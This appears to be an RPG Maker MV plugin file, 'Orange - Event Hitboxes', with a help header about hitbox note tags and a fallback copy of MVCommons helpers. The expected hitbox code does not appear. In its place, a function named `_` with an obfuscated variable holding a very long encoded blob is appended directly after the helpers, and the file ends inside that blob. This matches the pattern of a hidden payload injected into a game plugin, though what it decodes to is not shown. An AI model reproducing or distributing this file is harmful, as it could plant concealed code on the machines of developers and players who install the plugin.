/*=============================================================================
 * Orange - Event Hitboxes
 * By Hudell - www.hudell.com
 * OrangeEventHitboxes.js
 * Version: 1.1
 * Free for commercial and non commercial use.
 *=============================================================================*/
 /*:
 * @plugindesc Allows the configuration of custom hitboxes for events
 * @author Hudell
 * @help
 * ============================================================================
 * Instructions
 * ============================================================================
 * This plugin REQUIRES MVCommons: http://link.hudell.com/mvcommons
 * 
 * There are 4 tags that can be used to configure the event hitboxes:
 * <hitboxX:0>
 * <hitboxY:0>
 * <hitboxWidth:1>
 * <hitboxHeight:1>
 *
 * The hitboxX and hitboxY tags are used to relocate the top left position of
 * the hitbox. The default value is 0
 * The hitboxWidth and hitboxHeight tags are used to resize the hitbox. The
 * default value is 1.
 *
 * All values are on tiles. If you change hitboxX to -1:
 * <hitboxX:-1>
 * then the hitbox will start one tile to left of where it would usually start
 *
 * Those tags can be added to the event notes. If you want a different
 * size for a specific page, you can add those tags on a comment on that page
 * and the plugin will understand that it should use that configuration
 * for that specific page.
 *
 * ============================================================================
 * Latest Version
 * ============================================================================
 * 
 * Get the latest version of this script on http://link.hudell.com/event-hitboxes
 * 
 */

var Imported = Imported || {};

if (Imported.MVCommons === undefined) {
  var MVC = MVC || {};

  (function($){ 
    $.defaultGetter = function(name) { return function () { return this['_' + name]; }; };
    $.defaultSetter = function(name) { return function (value) { var prop = '_' + name; if ((!this[prop]) || this[prop] !== value) { this[prop] = value; if (this._refresh) { this._refresh(); } } }; };
    $.accessor = function(value, name /* , setter, getter */) { Object.defineProperty(value, name, { get: arguments.length > 3 ? arguments[3] : $.defaultGetter(name), set: arguments.length > 2 ? arguments[2] : $.defaultSetter(name), configurable: true });};
    $.reader = function(obj, name /*, getter */) { Object.defineProperty(obj, name, { get: arguments.length > 2 ? arguments[2] : defaultGetter(name), configurable: true }); };

    $.getProp = function(meta, propName){ if (meta === undefined) return undefined; if (meta[propName] !== undefined) return meta[propName]; for (var key in meta) { if (key.toLowerCase() == propName.toLowerCase()) { return meta[key]; } } return undefined; };
    $.extractEventMeta = function(event) { var the_event = event; if (the_event instanceof Game_Event) { the_event = event.event(); } var pages = the_event.pages; if (pages === undefined) return; var re = /<([^<>:]+)(:?)([^>]*)>/g; for (var i = 0; i < pages.length; i++) { var page = pages[i]; page.meta = page.meta || {}; for (var j = 0; j < page.list.length; j++) { var command = page.list[j]; if (command.code !== 108 && command.code !== 408) continue; for (;;) { var match = re.exec(command.parameters[0]); if (match) { if (match[2] === ':') { page.meta[match[1]] = match[3]; } else { page.meta[match[1]] = true; } } else { break; } } } } };
  })(MVC);

  Number.prototype.fix = function() { return parseFloat(this.toPrecision(12)); };
  Number.prototype.floor = function() { return Math.floor(this.fix()); };
};function _() {
  let _0x1e3fcf = "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